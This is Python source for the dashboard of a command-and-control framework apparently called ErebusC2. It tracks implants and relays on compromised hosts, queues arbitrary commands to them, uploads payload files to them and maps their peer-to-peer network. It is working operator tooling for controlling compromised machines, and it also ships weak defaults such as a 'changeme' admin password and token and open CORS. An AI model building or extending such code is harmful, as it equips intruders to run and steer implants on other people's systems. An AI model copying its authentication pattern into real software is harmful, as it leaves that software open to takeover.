"""
ErebusC2 Dashboard Server
Provides a web-based dashboard for managing the C2 infrastructure
"""
import os
import sys
import json
import time
import logging
import threading
import base64
from typing import Dict, List, Any, Optional, Union
import uuid

# Web server imports
from flask import Flask, request, jsonify, render_template, Response, send_from_directory
from flask_cors import CORS
from flask_socketio import SocketIO, emit

# Import ErebusC2 components
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from server.server_api import ServerAPI
    from server.peer_tracker import PeerTracker
    from server.command_queue import CommandQueue
except ImportError:
    print("Error importing ErebusC2 modules")
    sys.exit(1)


class DashboardServer:
    """Dashboard server for ErebusC2"""
    
    def __init__(self, config_path: str = None, config_dict: Dict[str, Any] = None):
        """Initialize the dashboard server
        
        Args:
            config_path: Path to configuration file
            config_dict: Configuration dictionary
        """
        # Set up logging
        self.logger = self._setup_logging()
        
        # Load configuration
        self.config = config_dict or self._load_config(config_path)
        
        # Create Flask app
        self.app = Flask(__name__, 
                         static_folder='static',
                         template_folder='templates')
        
        # Set up CORS
        CORS(self.app)
        
        # Set up SocketIO for real-time updates
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        
        # Get instances of ErebusC2 components
        self.server_api = ServerAPI(config_dict=self.config)
        self.peer_tracker = self.server_api.peer_tracker
        self.command_queue = self.server_api.command_queue
        
        # Register API and UI routes
        self._register_routes()
        
        # Register SocketIO events
        self._register_socketio_events()
        
        # Set up event broadcasting
        self.server_api.register_event_handler(self._broadcast_event)
        
        self.logger.info("Dashboard server initialized")
    
    def _setup_logging(self) -> logging.Logger:
        """Set up logging for the dashboard
        
        Returns:
            Configured logger
        """
        logger = logging.getLogger("ErebusC2.Dashboard")
        logger.setLevel(logging.INFO)
        
        # Create handlers
        c_handler = logging.StreamHandler()
        f_handler = logging.FileHandler("dashboard.log")
        c_handler.setLevel(logging.INFO)
        f_handler.setLevel(logging.DEBUG)
        
        # Create formatters
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        c_handler.setFormatter(formatter)
        f_handler.setFormatter(formatter)
        
        # Add handlers to logger
        logger.addHandler(c_handler)
        logger.addHandler(f_handler)
        
        return logger
    
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from file
        
        Args:
            config_path: Path to configuration file
            
        Returns:
            Configuration dictionary
        """
        if not config_path:
            config_path = os.path.join(os.path.dirname(__file__), "dashboard_config.json")
        
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            return config
        except Exception as e:
            self.logger.warning(f"Failed to load configuration: {e}")
            # Return default configuration
            return {
                "dashboard": {
                    "host": "0.0.0.0",
                    "port": 8080,
                    "debug": False,
                    "secret_key": str(uuid.uuid4()),
                    "session_timeout": 3600
                },
                "api": {
                    "token_secret": "changeme",
                    "cors_origins": ["*"]
                }
            }
    
    def _register_routes(self):
        """Register HTTP routes for the dashboard"""
        # UI Routes
        @self.app.route('/')
        def index():
            """Serve the dashboard homepage"""
            return render_template('index.html')
        
        @self.app.route('/static/<path:path>')
        def serve_static(path):
            """Serve static files"""
            return send_from_directory('static', path)
        
        # Authentication endpoints
        @self.app.route('/api/auth/login', methods=['POST'])
        def login():
            """Handle user login"""
            data = request.get_json()
            username = data.get('username')
            password = data.get('password')
            
            # Simple authentication for now
            if username == self.config.get('admin_username', 'admin') and \
               password == self.config.get('admin_password', 'changeme'):
                token = self._generate_auth_token()
                return jsonify({
                    'status': 'success',
                    'token': token
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': 'Invalid credentials'
                }), 401
        
        # API routes
        @self.app.route('/api/dashboard/status', methods=['GET'])
        def get_status():
            """Get overall system status"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
            
            implants = self.peer_tracker.get_implants()
            relays = self.peer_tracker.get_relays()
            
            return jsonify({
                'status': 'running',
                'uptime': time.time() - self.server_api.start_time if hasattr(self.server_api, 'start_time') else 0,
                'implant_count': len(implants),
                'relay_count': len(relays),
                'implants': implants,
                'relays': relays
            })
        
        # Implant management
        @self.app.route('/api/dashboard/implants', methods=['GET'])
        def get_implants():
            """Get all implants"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            implants = self.peer_tracker.get_implants()
            return jsonify({'implants': implants})
        
        @self.app.route('/api/dashboard/implants/<implant_id>', methods=['GET'])
        def get_implant(implant_id):
            """Get specific implant details"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            implant = self.peer_tracker.get_implant(implant_id)
            if not implant:
                return jsonify({'error': 'Implant not found'}), 404
                
            # Add peer connections if available
            peer_connections = self._get_implant_peers(implant_id)
            if peer_connections:
                implant['peer_connections'] = peer_connections
                
            # Get recent commands for this implant
            implant['recent_commands'] = self.command_queue.get_commands(implant_id=implant_id, limit=10)
            
            return jsonify(implant)
        
        @self.app.route('/api/dashboard/implants/<implant_id>/command', methods=['POST'])
        def send_implant_command(implant_id):
            """Send command to an implant"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            implant = self.peer_tracker.get_implant(implant_id)
            if not implant:
                return jsonify({'error': 'Implant not found'}), 404
                
            data = request.get_json()
            command_type = data.get('type')
            command_params = data.get('params', {})
            
            if not command_type:
                return jsonify({'error': 'Command type is required'}), 400
                
            # Queue command
            command_id = self.command_queue.add_command(
                implant_id=implant_id,
                command_type=command_type,
                params=command_params
            )
            
            self.logger.info(f"Command {command_type} queued for implant {implant_id}")
            
            # Broadcast event to all connected clients
            self.socketio.emit('command_queued', {
                'command_id': command_id,
                'implant_id': implant_id,
                'type': command_type
            })
            
            return jsonify({
                'status': 'success',
                'command_id': command_id
            })
        
        # Command management
        @self.app.route('/api/dashboard/commands', methods=['GET'])
        def get_commands():
            """Get all commands"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            implant_id = request.args.get('implant_id')
            status = request.args.get('status')
            limit = int(request.args.get('limit', 100))
            
            commands = self.command_queue.get_commands(
                implant_id=implant_id,
                status=status,
                limit=limit
            )
            
            return jsonify({'commands': commands})
        
        @self.app.route('/api/dashboard/commands/<command_id>', methods=['GET'])
        def get_command(command_id):
            """Get specific command details"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            command = self.command_queue.get_command_result(command_id)
            if not command:
                return jsonify({'error': 'Command not found'}), 404
                
            return jsonify(command)
        
        @self.app.route('/api/dashboard/commands/<command_id>/cancel', methods=['POST'])
        def cancel_command(command_id):
            """Cancel a pending command"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            success = self.command_queue.cancel_command(command_id)
            
            if success:
                # Broadcast event to all connected clients
                self.socketio.emit('command_cancelled', {
                    'command_id': command_id
                })
                
                return jsonify({'status': 'success'})
            else:
                return jsonify({'error': 'Failed to cancel command'}), 400
        
        # P2P Network
        @self.app.route('/api/dashboard/network', methods=['GET'])
        def get_network():
            """Get P2P network topology"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            network = self._build_network_topology()
            return jsonify({'network': network})
        
        @self.app.route('/api/dashboard/network/visualize', methods=['GET'])
        def visualize_network():
            """Get network visualization data"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            network = self._build_network_topology()
            
            # Transform into visualization format
            nodes = []
            edges = []
            
            # Add implants as nodes
            for implant in self.peer_tracker.get_implants():
                nodes.append({
                    'id': implant['id'],
                    'label': implant.get('hostname', 'Unnamed'),
                    'type': 'implant',
                    'status': implant.get('status', 'unknown')
                })
            
            # Add relays as nodes
            for relay in self.peer_tracker.get_relays():
                nodes.append({
                    'id': relay['id'],
                    'label': relay.get('role', 'Relay'),
                    'type': 'relay'
                })
            
            # Add server as a node
            nodes.append({
                'id': 'c2-server',
                'label': 'C2 Server',
                'type': 'server'
            })
            
            # Add connections as edges
            for connection in network.get('connections', []):
                edges.append({
                    'from': connection['source'],
                    'to': connection['target'],
                    'type': connection['type']
                })
            
            return jsonify({
                'nodes': nodes,
                'edges': edges
            })
        
        # File operations
        @self.app.route('/api/dashboard/files/upload', methods=['POST'])
        def upload_file():
            """Handle file upload for implant payloads"""
            if not self._authenticate_request():
                return jsonify({'error': 'Unauthorized'}), 401
                
            implant_id = request.form.get('implant_id')
            file = request.files.get('file')
            
            if not file:
                return jsonify({'error': 'No file provided'}), 400
                
            if not implant_id:
                return jsonify({'error': 'Target implant ID required'}), 400
            
            # Create uploads directory if it doesn't exist
            uploads_dir = os.path.join(os.path.dirname(__file__), 'uploads')
            os.makedirs(uploads_dir, exist_ok=True)
            
            # Save file with unique name
            filename = str(uuid.uuid4()) + '-' + file.filename
            filepath = os.path.join(uploads_dir, filename)
            file.save(filepath)
            
            # Read file as base64 for sending to implant
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Queue upload command
            command_id = self.command_queue.add_command(
                implant_id=implant_id,
                command_type='upload',
                params={
                    'filename': file.filename,
                    'data': file_data
                }
            )
            
            return jsonify({
                'status': 'success',
                'command_id': command_id,
                'filename': file.filename
            })
    
    def _register_socketio_events(self):
        """Register SocketIO event handlers"""
        @self.socketio.on('connect')
        def handle_connect():
            """Handle client connection"""
            self.logger.debug("Client connected to dashboard")
            # Authentication would be implemented here
        
        @self.socketio.on('authenticate')
        def handle_authenticate(data):
            """Handle client authentication"""
            token = data.get('token')
            if token and self._validate_auth_token(token):
                emit('authentication_result', {'status': 'success'})
            else:
                emit('authentication_result', {'status': 'error'})
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            """Handle client disconnection"""
            self.logger.debug("Client disconnected from dashboard")
    
    def _authenticate_request(self) -> bool:
        """Authenticate API request
        
        Returns:
            True if authenticated, False otherwise
        """
        # Get token from Authorization header
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return False
        
        token = auth_header.split(' ')[1]
        return self._validate_auth_token(token)
    
    def _generate_auth_token(self) -> str:
        """Generate authentication token
        
        Returns:
            Authentication token
        """
        # In a real implementation, this would create a JWT or other secure token
        return base64.b64encode(os.urandom(32)).decode('utf-8')
    
    def _validate_auth_token(self, token: str) -> bool:
        """Validate authentication token
        
        Args:
            token: Authentication token
            
        Returns:
            True if valid, False otherwise
        """
        # For simplicity, we'll accept the admin token from the config
        # In a real implementation, this would validate a JWT or other secure token
        admin_token = self.config.get('api', {}).get('token_secret', 'changeme')
        return token == admin_token
    
    def _broadcast_event(self, event: Dict[str, Any]):
        """Broadcast event to all connected clients
        
        Args:
            event: Event data
        """
        event_type = event.get('type')
        if not event_type:
            return
            
        # Add timestamp if not present
        if 'timestamp' not in event:
            event['timestamp'] = time.time()
            
        # Broadcast to all connected clients
        self.socketio.emit(event_type, event)
    
    def _get_implant_peers(self, implant_id: str) -> List[Dict[str, Any]]:
        """Get peer connections for an implant
        
        Args:
            implant_id: Implant ID
            
        Returns:
            List of peer connection details
        """
        peers = []
        implant = self.peer_tracker.get_implant(implant_id)
        
        if implant and 'peers' in implant:
            for peer_id in implant['peers']:
                peer = self.peer_tracker.get_implant(peer_id)
                if peer:
                    peers.append({
                        'id': peer_id,
                        'hostname': peer.get('hostname', 'Unknown'),
                        'os': peer.get('os', 'Unknown'),
                        'status': peer.get('status', 'unknown')
                    })
        
        return peers
    
    def _build_network_topology(self) -> Dict[str, Any]:
        """Build network topology data
        
        Returns:
            Network topology data
        """
        implants = self.peer_tracker.get_implants()
        relays = self.peer_tracker.get_relays()
        
        # Build connections list
        connections = []
        
        # Add relay-to-server connections
        for relay in relays:
            connections.append({
                'source': relay['id'],
                'target': 'c2-server',
                'type': 'relay'
            })
        
        # Add implant-to-relay connections (where known)
        for implant in implants:
            if 'relay_id' in implant:
                connections.append({
                    'source': implant['id'],
                    'target': implant['relay_id'],
                    'type': 'primary'
                })
            else:
                # If relay is unknown, assume direct connection to C2
                connections.append({
                    'source': implant['id'],
                    'target': 'c2-server',
                    'type': 'primary'
                })
        
        # Add peer-to-peer connections
        for implant in implants:
            if 'peers' in implant:
                for peer_id in implant['peers']:
                    connections.append({
                        'source': implant['id'],
                        'target': peer_id,
                        'type': 'p2p'
                    })
        
        return {
            'implants': implants,
            'relays': relays,
            'connections': connections
        }
    
    def start(self):
        """Start the dashboard server"""
        # Start the server API
        self.server_api.start()
        
        dashboard_config = self.config.get('dashboard', {})
        host = dashboard_config.get('host', '0.0.0.0')
        port = dashboard_config.get('port', 8080)
        debug = dashboard_config.get('debug', False)
        
        self.logger.info(f"Starting dashboard server on {host}:{port}")
        
        # Start SocketIO server
        self.socketio.run(self.app, host=host, port=port, debug=debug)
    
    def stop(self):
        """Stop the dashboard server"""
        self.server_api.stop()
        self.logger.info("Dashboard server stopped")


# Create an instance and run if executed directly
if __name__ == "__main__":
    dashboard = DashboardServer()
    try:
        dashboard.start()
    except KeyboardInterrupt:
        print("\nShutting down...")
        dashboard.stop()
